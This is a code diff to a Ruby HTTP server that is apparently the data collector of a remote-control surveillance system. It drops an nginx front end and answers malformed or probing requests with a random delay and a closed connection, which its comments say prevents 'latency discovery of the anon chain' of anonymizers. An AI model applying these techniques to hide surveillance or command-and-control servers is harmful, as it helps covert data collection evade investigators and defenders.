@@ -8,7 +8,6 @@ require_relative 'http_parser'
 require_relative 'sessions'
 require_relative 'statistics'
 require_relative 'firewall'
-require_relative 'nginx'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -67,8 +66,13 @@ class HTTPHandler < EM::HttpServer::Server
 
     trace :warn, "HACK ALERT: #{@peer} is sending bad requests: #{@http_headers.inspect}"
 
-    page, options = BadRequestPage.create(request)
-    return page
+    # sleep a random amount of time
+    # this is done to prevent latency discovery of the anon chain
+    sleep rand
+    # close the connection
+    close_connection
+
+    return ''
   end
 
   # return the content of the X-Forwarded-For header
@@ -82,6 +86,14 @@ class HTTPHandler < EM::HttpServer::Server
     trace :info, "[#{@peer}] has forwarded the connection for #{peers.inspect}"
     # we just want the first peer that is the original one
     return peers.first
+  end
+
+  def invalid_http_protocol
+    trace :warn, "HACK ALERT: #{@peer} is sending bad requests (#{@http_protocol}): #{@http_headers.inspect}"
+    # sleep a random amount of time
+    # this is done to prevent latency discovery of the anon chain
+    sleep rand
+    close_connection
   end
 
   def process_http_request
@@ -114,13 +126,17 @@ class HTTPHandler < EM::HttpServer::Server
         generation_time = Time.now
 
         begin
-          raise "HACK ALERT: #{@peer} Invalid http protocol (#{@http_protocol})" if @http_protocol != 'HTTP/1.1' and @http_protocol != 'HTTP/1.0'
+          if @http_protocol != 'HTTP/1.1' and @http_protocol != 'HTTP/1.0'
+            invalid_http_protocol
+            # return from block
+            next
+          end
 
           # parse all the request params
           request = prepare_request @http_request_method, @http_request_uri, @http_query_string, @http_content, @http, @peer
 
           # get the correct controller
-          controller = CollectorController.new
+          controller = CollectorController.new @signature
           controller.request = request
 
           # do the dirty job :)
@@ -138,17 +154,17 @@ class HTTPHandler < EM::HttpServer::Server
           trace :error, e.message
           trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")
 
-          request = {}
-          request[:headers] = @http
-          responder = RESTResponse.new(RESTController::STATUS_BAD_REQUEST, *BadRequestPage.create(request))
-          reply = responder.prepare_response(self, {})
-          reply
+          close_connection
         end
 
       end
 
       # Callback block to execute once the request is fulfilled
       response = proc do |reply|
+        # safe escape on invalid reply
+        next unless reply
+
+        # send the actual response
         reply.send_response
 
          # keep the size of the reply to be used in the closing method
@@ -178,12 +194,6 @@ class HttpServer
 
     Firewall.create_default_rules
 
-    if RCS::Collector::Config.instance.global['USE_NGINX']
-      start_nginx
-      # put the ruby server on a different port
-      @port += 1
-    end
-
     trace(:info, "Listening on port #{@port}...")
     @server_handle = EM.start_server("0.0.0.0", @port, HTTPHandler)
   rescue Exception => e
@@ -194,28 +204,12 @@ class HttpServer
   def self.stop
     return unless @server_handle
 
-    Nginx.stop if RCS::Collector::Config.instance.global['USE_NGINX']
-
     trace(:info, "Stopping http server...")
     EM.stop_server(@server_handle) if @server_handle
     @server_handle = nil
   rescue Exception => e
     trace(:fatal, "Unable to stop http server: #{e.message} #{e.backtrace}")
     exit!(1)
-  end
-
-  def self.start_nginx
-    Nginx.first_hop = Config.instance.global['COLLECTOR_IS_GOOD'] ? "0.0.0.0/0" : DBCache.first_anonymizer
-    Nginx.save_config
-    begin
-      Nginx.start
-    rescue Exception => e
-      trace :error, "Cannot start Nginx: #{e.message}"
-      Nginx.stop!
-      sleep 1
-      retry
-    end
-
   end
 
 end
